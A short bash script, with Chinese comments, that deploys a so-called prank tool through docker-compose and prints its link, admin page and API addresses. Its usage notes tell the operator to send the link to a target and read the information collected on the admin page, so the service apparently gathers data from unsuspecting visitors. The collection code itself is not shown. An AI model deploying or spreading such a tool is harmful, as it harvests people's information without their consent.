#!/bin/bash

# 整人小工具部署脚本

set -e

echo "🎁 开始部署整人小工具..."

# 检查 Docker 是否安装
if ! command -v docker &> /dev/null; then
    echo "❌ Docker 未安装，请先安装 Docker"
    exit 1
fi

# 检查 docker-compose 是否安装
if ! command -v docker-compose &> /dev/null; then
    echo "❌ docker-compose 未安装，请先安装 docker-compose"
    exit 1
fi

# 停止旧容器
echo "🛑 停止旧容器..."
docker-compose down 2>/dev/null || true

# 构建并启动
echo "🔨 构建镜像..."
docker-compose build --no-cache

echo "🚀 启动服务..."
docker-compose up -d

# 等待服务启动
echo "⏳ 等待服务启动..."
sleep 5

# 检查服务状态
echo "✅ 检查服务状态..."
docker-compose ps

echo ""
echo "========================================="
echo "🎉 部署完成！"
echo "========================================="
echo ""
echo "📍 访问地址:"
echo "   整人链接: http://$(hostname -I | awk '{print $1}' 2>/dev/null || echo 'your-server'):8088"
echo "   管理页面: http://$(hostname -I | awk '{print $1}' 2>/dev/null || echo 'your-server'):8088/admin.html"
echo "   后端 API: http://$(hostname -I | awk '{print $1}' 2>/dev/null || echo 'your-server'):5001"
echo ""
echo "📝 使用方法:"
echo "   1. 将整人链接发送给目标用户"
echo "   2. 在管理页面查看收集到的信息"
echo ""
echo "⚠️  提醒: 本工具仅供娱乐，请勿用于非法目的！"

